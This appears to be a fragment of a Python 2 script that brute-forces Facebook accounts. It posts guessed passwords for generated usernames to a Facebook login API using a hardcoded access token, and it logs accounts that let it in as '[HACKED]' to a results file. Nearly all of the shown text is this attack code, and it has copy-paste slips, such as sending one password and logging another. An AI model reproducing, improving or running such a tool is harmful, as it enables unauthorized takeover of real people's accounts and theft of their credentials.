...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m[HACKED]\x1b[1;93m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass4 + '\n')
                okb.close()
                oks.append(c + user + pass4)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[CHEKPOINT]\x1b[1;97m ' + k + c + user + ' >>> ' + pass4 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m[HACKED]\x1b[1;93m ' + k + c + user + ' >>> ' + pass5 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass5 + '\n')
                okb.close()
                oks.append(c + user + pass5)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[CHEKPOINT]\x1b[1;97m ' + k + c + user + ' >>> ' + pass5 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m[HACKED]\x1b[1;93m ' + k + c + user + ' >>> ' + pass6 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass6 + '\n')
                okb.close()
                oks.append(c + user + pass6)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[CHEKPOINT]\x1b[1;97m ' + k + c + user + ' >>> ' + pass6 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m[HACKED]\x1b[1;93m ' + k + c + user + ' >>> ' + pass7 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass7 + '\n')
                okb.close()
                oks.append(c + user + pass7)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[CHEKPOINT]\x1b[1;97m ' + k + c + user + ' >>> ' + pass7 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m[HACKED]\x1b[1;93m ' + k + c + user + ' >>> ' + pass8 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass8 + '\n')
                okb.close()
                oks.append(c + user + pass8)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[CHEKPOINT]\x1b[1;97m ' + k + c + user + ' >>> ' + pass8 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m[HACKED]\x1b[1;93m ' + k + c + user + ' >>> ' + pass9 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass9 + '\n')
                okb.close()
                oks.append(c + user + pass4)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[CHEKPOINT]\x1b[1;97m ' + k + c + user + ' >>> ' + pass9 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass9 + '\n')
                cps.close()
                cpb.append(c + user + pass9)
            else:
                pass10 = '1122334455667788'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m[HACKED]\x1b[1;93m ' + k + c + user + ' >>> ' + pass10 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass10 + '\n')
                okb.close()
                oks.append(c + user + pass10)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[CHEKPOINT]\x1b[1;97m ' + k + c + user + ' >>> ' + pass10 + '\n'
                cps = open('save/checkpoint.txt', 'a')
